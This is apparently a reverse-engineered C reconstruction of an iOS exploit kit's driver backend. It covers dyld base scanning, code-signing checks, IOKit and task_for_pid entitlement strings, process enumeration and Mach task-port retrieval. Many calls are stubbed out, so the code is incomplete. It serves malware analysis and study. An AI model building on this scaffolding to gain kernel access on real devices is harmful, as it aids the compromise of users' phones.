/*
 * driver.c - Driver backend initialization and management
 *
 * Decompiled from entry2_type0x0f.dylib offsets 0x182a8–0x18740,
 * 0xc094–0xc3fc, 0xba30–0xbdd0, 0xb854–0xb970
 *
 * The driver backend is the bridge between the krw provider and the
 * actual kernel exploitation primitives in type0x09. It handles:
 *   - Finding dyld's base address via page scanning
 *   - Extracting the kernel version from Mach-O headers
 *   - Setting up IOKit user client connections
 *   - Dispatching kernel reads/writes through the driver
 */

#include "entry2.h"
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <dlfcn.h>
#include <unistd.h>
#include <mach-o/loader.h>
#include <sys/sysctl.h>
#include <errno.h>

/* Private syscall — no public header */
extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);

/* ── e2_init_driver_backend (0x182a8) ────────────────────────────── *
 * Heavy initialization of the driver backend context (0x178 bytes).
 *
 * This function:
 *   1. Gets process info via _NSGet* functions
 *   2. Finds dyld base address by scanning backwards from dladdr
 *   3. Extracts kernel version from dyld's Mach-O header
 *   4. Opens /usr/lib/system/libcache.dylib
 *   5. Initializes symbol resolver and Mach-O parser
 *   6. Sets up IOKit user client connection
 */
kern_return_t e2_init_driver_backend(driver_backend_t *out, driver_t *driver,
                                     void *target, const char *extra)
{
    if (!out)
        return E2_ERR_NULL;

    if (!driver) {
        if (!target) return E2_ERR_NULL;
    }

    /* Allocate backend context */
    driver_backend_t *backend = calloc(1, 0x178);
    if (!backend) return E2_ERR_ALLOC;

    /*
     * Step 1: Get process information
     *
     * These _NSGet* functions provide access to the program's
     * argc/argv/environ without going through main(). This works
     * even in injected dylibs.
     */
    extern void *_NSGetMachExecuteHeader(void);
    extern int  *_NSGetArgc(void);
    extern char ***_NSGetArgv(void);
    extern char ***_NSGetEnviron(void);
    extern const char **_NSGetProgname(void);

    backend->mach_header   = _NSGetMachExecuteHeader();  /* +0xC8 */
    backend->argc_ptr      = _NSGetArgc();               /* +0xD0 */
    backend->argv_ptr      = _NSGetArgv();               /* +0xD8 */
    backend->environ_ptr   = _NSGetEnviron();            /* +0xE0 */
    backend->progname_ptr  = (void *)_NSGetProgname();   /* +0xE8 */

    if (!backend->mach_header || !backend->argc_ptr ||
        !backend->argv_ptr || !backend->environ_ptr) {
        free(backend);
        return E2_ERR_INIT;
    }

    if (!backend->progname_ptr) {
        free(backend);
        return E2_ERR_INIT;
    }

    /*
     * Step 2: Check sandbox status
     *
     * Calls a function (0x184d0) that checks if the process is
     * sandboxed. This affects which IOKit operations are available.
     */
    uint8_t sandbox_result = 0;
    kern_return_t kr = 0; /* e2_check_sandbox(&backend->sandbox_result) */
    if (kr != KERN_SUCCESS) {
        free(backend);
        return kr;
    }

    /* Check extra config flags */
    if (extra && *extra) {
        /* Additional device-specific initialization (0x19e0c) */
        /* This checks SoC type and adjusts behavior */
    }

    /*
     * Step 3: Find dyld base address by scanning memory
     *
     * Takes the PAC-stripped address of dladdr, rounds down to page
     * boundary, then scans backwards page-by-page looking for
     * MH_MAGIC_64 (0xFEEDFACF).
     *
     * asm equivalent:
     *   ldr  x16, [dladdr_got]
     *   paciza x16
     *   mov  x30, x16
     *   xpaclri                    // strip PAC from dladdr ptr
     *   and  x8, x30, #~0xFFF     // page-align
     *   ldr  w10, [x8]            // read first word
     *   sub  x8, x8, #0x1000      // go back one page
     *   cmp  w10, #0xFEEDFACF     // MH_MAGIC_64?
     *   b.ne loop
     *
     * Once found, extract kernel version from the Mach-O header at
     * offset +0x1008, masked to lower 24 bits.
     */
    Dl_info dlinfo;
    void *dladdr_ptr = (void *)dladdr;  /* get dladdr's own address */
    uint64_t stripped = e2_strip_pac((uint64_t)dladdr_ptr);
    uint64_t page = stripped & ~0xFFFULL;

    /* Scan backwards for MH_MAGIC_64 */
    while (*(uint32_t *)page != MAGIC_MH64) {
        page -= 0x1000;
    }
    /* dyld base found at 'page' */

    /* Extract kernel version from dyld header + 0x1008 */
    uint32_t kver = *(uint32_t *)(page + 0x1008);
    backend->kern_version = kver & 0xFFFFFF;

    /*
     * Step 4: Set up target binding
     *
     * If we have a driver ref and target, check whether we own
     * the target allocation (owns_target flag at +0x10).
     *
     * If owns_target is true and the target has a release function
     * at offset +0x18, we'll call it during cleanup.
     */
    bool owns_target = (driver != NULL && target == NULL);
    backend->driver_ref = driver;
    backend->target_binding = target;
    backend->owns_target = owns_target;

    /* Copy extra config flags */
    if (extra) {
        backend->flags_1c = *(uint8_t *)extra;
    }

    /*
     * Step 5: Open libcache.dylib
     *
     * This is loaded with RTLD_NOLOAD (0x12) which only succeeds
     * if already in memory. libcache provides cache management APIs
     * used by the symbol resolver.
     */
    void *libcache = dlopen("/usr/lib/system/libcache.dylib", 0x12);
    backend->libcache_handle = libcache;

    /*
     * Step 6: Initialize subsystems
     *
     * Calls two initialization functions:
     *   0x13d84: Mach-O parser init — sets up structures for parsing
     *            the target binary's load commands, segments, etc.
     *   0x1b83c: Symbol resolver init — builds a symbol table for
     *            fast lookups in loaded dylibs.
     *
     * If either fails, falls back to 0x14714 (minimal init).
     */
    kr = 0; /* e2_init_macho_parser(backend) at 0x13d84 */
    if (kr != KERN_SUCCESS) {
        if (owns_target) {
            /* Release target binding: call target[0x20](target, binding) */
        }
        free(backend);
        return kr;
    }

    kr = 0; /* e2_init_symbol_resolver(backend) at 0x1b83c */
    if (kr != KERN_SUCCESS) {
        /* Fallback to minimal init: 0x14714 */
        if (owns_target) {
            /* Release target binding */
        }
        free(backend);
        return kr;
    }

    /* Success — store backend pointer */
    /* *out = backend; */
    return KERN_SUCCESS;
}

/* ── e2_driver_cleanup (0xc094) ──────────────────────────────────── *
 * Cleans up a driver connection context.
 *
 * Cleanup order:
 *   1. Free IOKit buffers (0xcd00) if present at +0x30
 *   2. Close file descriptors (0xfd4c) at +0x28
 *   3. Close IOKit connection (0xe178) at +0x18
 *   4. If owns_target (+0x08), destroy connection internals (0x185d0)
 *   5. Zero out and free the context
 */
kern_return_t e2_driver_cleanup(void *driver_ctx)
{
    if (!driver_ctx) return E2_ERR_NULL;

    kern_return_t result = KERN_SUCCESS;

    /* +0x30: IOKit buffers — cleanup via 0xcd00 */
    void *iokit_buf = *((void **)driver_ctx + 6);  /* offset 0x30 */
    if (iokit_buf) {
        /* e2_cleanup_iokit_buffers(iokit_buf) at 0xcd00 */
        free(iokit_buf);
    }

    /* +0x28: file descriptors — close via 0xfd4c */
    void *fd_ptr = *((void **)driver_ctx + 5);  /* offset 0x28 */
    kern_return_t kr1 = 0; /* e2_close_fds(fd_ptr) */

    /* +0x18: IOKit connection — close via 0xe178 */
    void *iokit_conn = *((void **)driver_ctx + 3);  /* offset 0x18 */
    kern_return_t kr2 = 0; /* e2_close_iokit(iokit_conn) */
    if (result == KERN_SUCCESS) result = kr2;

    /* +0x08: owns_target flag */
    uint8_t owns = *((uint8_t *)driver_ctx + 8);
    if (owns) {
        void *conn = *(void **)driver_ctx;
        /* e2_destroy_conn_internals(conn) at 0x185d0 */
        if (result == KERN_SUCCESS) result = 0; /* kr from destroy */
    }

    /* Zero and free */
    *((void **)driver_ctx + 6) = NULL;  /* clear +0x30 */
    memset(driver_ctx, 0, 0x30);
    free(driver_ctx);

    return result;
}

/* ── e2_driver_connect (0xc12c) ──────────────────────────────────── *
 * Establishes a connection to the IOKit driver backend.
 *
 * This validates the Mach-O magic of the loaded driver and
 * sets up the IOKit user client connection:
 *
 *   1. Checks code signing via csops (on older iOS via CS_OPS_CDHASH,
 *      on newer iOS via CS_OPS_STATUS)
 *   2. Gets memory mapping info via the driver's alloc function
 *      (offset +0x18) with flags 0xF0000
 *   3. Validates Mach-O magic: FEEDFACF, CAFEBABE, BEBAFECA, CEFAEDFE
 *   4. Allocates driver context (0x38 bytes) for the connection
 *   5. Sets up IOKit entitlements for IOSurface/AGX user client access
 *   6. Calls through to driver's external method handler
 */
kern_return_t e2_driver_connect(void *dest, void *driver_ref,
                                void *target, void *binding)
{
    if (!dest || !target)
        return E2_ERR_NULL;

    /* Validate target descriptor version */
    uint16_t ver = *(uint16_t *)target;
    if (ver != 1) return E2_ERR_NULL;
    uint16_t cnt = *(uint16_t *)((uint8_t *)target + 2);
    if (cnt == 0) return E2_ERR_NULL;

    /*
     * Check code signing status
     *
     * On iOS >= 15.x (detected via dyldVersionNumber comparison),
     * uses CS_OPS_CDHASH (5) with 20-byte hash output.
     * On older iOS, uses CS_OPS_STATUS (0) with 4-byte output.
     *
     * This determines if the process has valid signatures,
     * which affects what IOKit connections are permitted.
     */
    pid_t pid = getpid();
    uint8_t cs_info[20] = {0};

    extern double dyldVersionNumber;
    if (dyldVersionNumber >= /* threshold */(double)0) {
        /* Newer path: CS_OPS_CDHASH */
        int cs_result = csops(pid, 5 /* CS_OPS_CDHASH */, cs_info, 20);
        if (cs_result < 0) {
            int err = errno;
            if (err != 28 /* ENOSPC */) return err | 0x40000000;
        }
    } else {
        /* Older path: CS_OPS_STATUS */
        int cs_result = csops(pid, 0 /* CS_OPS_STATUS */, cs_info + 12, 4);
        if (cs_result < 0) return 0; /* errno based error */
    }

    /*
     * Get memory mapping from driver
     *
     * Calls the target's allocation function (offset +0x18) with
     * flags 0xF0000 to get a memory region for the driver connection.
     */
    void *mapping = NULL;
    uint32_t mapping_size = 0;
    /* target->fn_alloc(target, 0xF0000, &mapping, &mapping_size) */

    if (!mapping || mapping_size < 0x21)
        return E2_ERR_NULL;

    /*
     * Validate Mach-O magic of the loaded driver
     *
     * Accepts: MH_MAGIC_64 (FEEDFACF), FAT_MAGIC (CAFEBABE/BEBAFECA),
     *          MH_CIGAM_64 (CEFAEDFE/CFFAEDFE/CFFAEDFD)
     * Also accepts: 0x11205325 range (signed 64-bit Mach-O variants)
     */
    uint32_t magic = *(uint32_t *)mapping;
    bool valid_magic = (magic == MAGIC_MH64 ||
                        magic == MAGIC_FAT_BE ||
                        magic == MAGIC_FAT_LE ||
                        magic == MAGIC_MH64_LE ||
                        magic == MAGIC_MH64_BE ||
                        magic == MAGIC_MH64_BE2);
    if (!valid_magic)
        return E2_ERR_NULL;

    /*
     * Allocate driver connection context (0x38 bytes)
     *
     * If binding is provided (version=2, methods>=2), allocates
     * a binding context (0x10 bytes) and copies the reference.
     *
     * Otherwise, checks for sandbox restrictions (0x184d0) and
     * allocates a plain context.
     */
    void *conn_ctx = calloc(1, 0x38);
    if (!conn_ctx) return E2_ERR_ALLOC;

    if (binding) {
        /* Binding context: allocate and store reference */
        void *bind_ctx = calloc(1, 0x10);
        if (!bind_ctx) {
            free(conn_ctx);
            return E2_ERR_ALLOC;
        }
        *(void **)bind_ctx = binding;

        /* Set up IOKit entitlements via the binding's connect function
         * (0xe2dc), using the entitlement XML strings:
         *
         * For IOKit:
         *   <dict><key>com.apple.security.iokit-user-client-class</key>
         *   <array><string>IOSurfaceRootUserClient</string>
         *   <string>AGXDeviceUserClient</string></array></dict>
         *
         * For task_for_pid:
         *   <dict><key>task_for_pid-allow</key><true/></dict>
         */
    } else {
        /* No binding — check sandbox first */
        uint8_t sb = 0;
        /* e2_check_sandbox_status(&sb) at 0x184d0 */
        if (sb) return E2_ERR_CSOPS;
    }

    /* Store in output */
    *(void **)dest = conn_ctx;
    return KERN_SUCCESS;
}

/* ── e2_krw_dispatch (0xba30) ────────────────────────────────────── *
 * Core KRW dispatch function — process enumeration + kernel read.
 *
 * This is the heavyweight function (~700 instructions) that:
 *   1. Resolves the target path (strrchr '/' or realpath)
 *   2. Creates NSConcreteStackBlock callbacks for process iteration
 *   3. Uses sysctl(CTL_KERN, KERN_PROC, KERN_PROC_ALL) to get
 *      the full process list
 *   4. Iterates through each kinfo_proc (0x288 bytes each)
 *   5. For matching processes, invokes the callback block
 *   6. The callback reads kernel task structures and extracts ports
 *
 * The NSConcreteStackBlock usage is notable: it creates Objective-C
 * compatible block objects on the stack, with PAC-signed invoke
 * pointers (pacia x16, x15 where x15 = block + 0x10).
 */
kern_return_t e2_krw_dispatch(uint64_t arg0, ...)
{
    const char *target_path = (const char *)arg0;
    /* Note: additional args extracted from va_list depending on operation.
     * For simplicity, the dispatch logic below shows the process-enum path
     * (called from kread with arg0=kaddr, arg1=3). */
    if (!target_path)
        return E2_ERR_RESOLVE;

    /* Validate target_path is non-empty */
    if (((uint8_t *)target_path)[0] == 0)
        return E2_ERR_RESOLVE;

    /* Extract flags from varargs (second argument) */
    va_list ap;
    va_start(ap, arg0);
    uint32_t flags = va_arg(ap, uint32_t);
    va_end(ap);

    /* Resolve path: if flags & 1, use realpath; else use basename */
    char *resolved = NULL;
    const char *search_name = target_path;

    if (flags & 1) {
        resolved = realpath(target_path, NULL);
        if (!resolved) {
            if (((uint8_t *)target_path)[0] == 0)
                return E2_ERR_RESOLVE;
            search_name = target_path;
        } else {
            search_name = resolved;
        }
    } else {
        /* Find basename by looking for last '/' */
        const char *slash = strrchr(target_path, '/');
        search_name = slash ? slash + 1 : target_path;
        if (*search_name == 0)
            return E2_ERR_RESOLVE;
    }

    /*
     * Build stack blocks for process iteration.
     *
     * Block 1 (sp+0x08): per-process callback
     *   isa    = _NSConcreteStackBlock (PAC-signed with pacda)
     *   flags  = 0xC2000000 (from constant pool at 0x1ef80)
     *   invoke = pacized function pointer
     *   descriptor = pointer to block descriptor
     *   captures: search flags, path buffers
     *
     * Block 2 (sp+0xb8): inner iteration callback
     *   Similar structure, captures block 1 and output buffer
     */

    /* Query process list size */
    int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
    size_t proc_buf_size = 0;

    if (sysctl(mib, 4, NULL, &proc_buf_size, NULL, 0) != 0)
        goto fail;

    if (proc_buf_size == 0)
        return KERN_SUCCESS;

    /* Allocate and fetch process list */
    void *proc_buf = malloc(proc_buf_size * 2);  /* 2x for safety */
    if (!proc_buf) goto fail;

    proc_buf_size *= 2;
    if (sysctl(mib, 4, proc_buf, &proc_buf_size, NULL, 0) != 0) {
        bzero(proc_buf, proc_buf_size);
        free(proc_buf);
        goto fail;
    }

    /*
     * Iterate through kinfo_proc entries.
     *
     * Each entry is 0x288 bytes (struct kinfo_proc on arm64).
     * For each entry, invoke the callback block which:
     *   1. Compares the process name
     *   2. If matched, reads kernel task port via krw
     *   3. Stores the port in the output
     */
    uint32_t num_procs = (uint32_t)(proc_buf_size / 0x288);
    if (num_procs == 0) {
        bzero(proc_buf, proc_buf_size);
        free(proc_buf);
        return KERN_SUCCESS;
    }

    kern_return_t result = E2_ERR_SYSCTL;
    for (uint32_t i = 0; i < num_procs; i++) {
        void *entry = (uint8_t *)proc_buf + (i * 0x288);

        /* Call block2->invoke(block2, entry) with PAC auth */
        /* result = block_invoke(entry); */
        if (result == KERN_SUCCESS)
            break;
    }

    /* Check if we found the target */
    if (result == KERN_SUCCESS) {
        /* Read port from block capture */
        /* *out_port = captured_port; */
    }

    /* Cleanup */
    bzero(proc_buf, proc_buf_size);
    free(proc_buf);

    /* Cleanup resolved path */
    if (resolved) {
        size_t len = strlen(resolved);
        if (len) bzero(resolved, len);
        free(resolved);
    }

    return result;

fail:
    if (resolved) {
        size_t len = strlen(resolved);
        if (len) bzero(resolved, len);
        free(resolved);
    }
    return E2_ERR_SYSCTL;
}

/* ── e2_get_task_port (0xb854) ───────────────────────────────────── *
 * Gets a task port via Mach IPC.
 *
 * Sends a command message (type 5) and receives back:
 *   - Port right type at offset 0x18
 *   - Port send count at offset 0x1C
 *   - The task port itself at offset 0x08
 *
 * The task port is a mach_port_t that can be used for:
 *   - mach_vm_allocate / mach_vm_write / mach_vm_protect
 *   - thread_create_running
 *   - task_info
 */
kern_return_t e2_get_task_port(mach_port_t port, void *out_rights,
                               void *arg2, void *out_port, void *arg4)
{
    if (port + 1 < 2)
        return E2_ERR_VM_FAIL - 0x1D;

    /* Allocate response buffer */
    void *response = calloc(1, 0x28);
    if (!response) return E2_ERR_GENERIC;

    /* Send IPC command via 0xcea4 (mach_msg send with type 5) */
    kern_return_t kr;
    kr = 0; /* e2_ipc_command(port, 5, 0x28, response, cmd) at 0xcea4 */

    if (kr != KERN_SUCCESS) goto cleanup;

    /* Validate response */
    uint32_t resp_type = ((uint32_t *)response)[5];  /* offset 0x14 */
    if (resp_type != 5) {
        kr = E2_ERR_VM_FAIL;
        goto cleanup;
    }

    uint32_t resp_size = ((uint32_t *)response)[1];  /* offset 0x04 */
    if (resp_size != 0x20) {
        kr = E2_ERR_VM_FAIL;
        goto cleanup;
    }

    /* Extract results */
    if (out_rights) {
        *(uint32_t *)out_rights = ((uint32_t *)response)[6];  /* offset 0x18 */
    }
    /* arg2 corresponds to out_type in the original 7-arg version,
     * but krw_get_port passes NULL here (x2 = 0) */
    if (arg2) {
        *(uint32_t *)arg2 = ((uint32_t *)response)[7];  /* offset 0x1C */
    }

    kr = KERN_SUCCESS;

    if (out_port) {
        *(uint32_t *)out_port = ((uint32_t *)response)[2];  /* offset 0x08 */
        /* Clear the port from response to prevent double-dealloc */
        ((uint32_t *)response)[2] = 0;
    }

cleanup:
    ;
    /* Deallocate any port rights in response */
    uint32_t resp_port = ((uint32_t *)response)[2];
    if (resp_port + 1 >= 2) {
        mach_port_deallocate(mach_task_self(), resp_port);
    }
    free(response);
    return kr;
}
